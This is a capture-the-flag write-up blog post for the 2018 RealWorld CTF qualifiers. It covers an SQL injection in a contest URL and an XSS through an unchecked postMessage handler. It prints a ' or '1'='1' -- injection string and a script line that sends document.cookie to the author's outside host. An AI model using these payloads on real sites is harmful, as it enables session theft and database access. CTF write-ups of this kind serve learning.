@@ -1,0 +1,78 @@
+---
+title: "2018::RealWorldCTF::Qual"
+description: ""
+publishDate: "2018-07-30"
+category: "CTF"
+layout: "../../layouts/ArticleLayout.astro"
+---
+RealWorld CTF is very interesting and that is the hardest check-in challenge I've ever saw.
+
+# Advertisement
+
+This challenge gave nothing, but just one line
+
+`This platform is under protection. DO NOT hack it.`
+
+Trying not to hack the web, but I can't find anything.
+I did find something interesting, like this one:
+<Image src="./console.png" alt="" />
+
+It seems to use WebSocket to get some information then render it on template view. 
+So, let's change the hash-like string on url.
+
+When url is `https://realworldctf.com/contest/5`
+<Image src="./invalid.png" alt="" />
+
+When url is `https://realworldctf.com/contest/5b5bc8c532a7ca004d2d0f64` (Make the length of hash-like string consist with origin)
+<Image src="./database.png" alt="" />
+
+Did you say `Database`?
+`https://realworldctf.com/contest/' or '1'='1' --`
+<Image src="./flag.png" alt="" />
+
+
+
+My teamate kaibro told me that chaitin has sqlchop product.... ohh.... advertisement... got it
+It took me half day to find the flag
+# Dot Free
+
+There are some js functoin on web page:
+```js
+    function lls(src) {
+        var el = document.createElement('script');
+        if (el) {
+            el.setAttribute('type', 'text/javascript');
+            el.src = src;
+            document.body.appendChild(el);
+        }
+    };
+
+    function lce(doc, def, parent) {
+    // ...
+    };
+    window.addEventListener('message', function (e) {
+        if (e.data.iframe) {
+            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("。") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {
+                if (e.data.iframe.type == "iframe") {
+                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
+                } else {
+                    lls(e.data.iframe.value)
+                }
+            }
+        }
+    }, false);
+    window.onload = function (ev) {
+        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
+    }
+```
+
+And I found some keyword like `login passwd`,`login account` in css, so I think that we can try to XSS.
+
+We append string to url, the `xxxxxxxx` part sould replaced by ip in integer form:
+`http://13.57.104.34/?{"iframe":{"value":"http:\\\\xxxxxxxx"}}`
+
+And put a javascript on your machine:
+`document.location="http:\\\\my.ip.put.here/a?cookie="+document.cookie;`
+
+Then go to apache log to get the  flag:
+`13.57.104.34 - - [29/Jul/2018:14:36:15 +0000] "GET /a?cookie=flag=rwctf%7BL00kI5TheFlo9%7D HTTP/1.1" 404 496 `
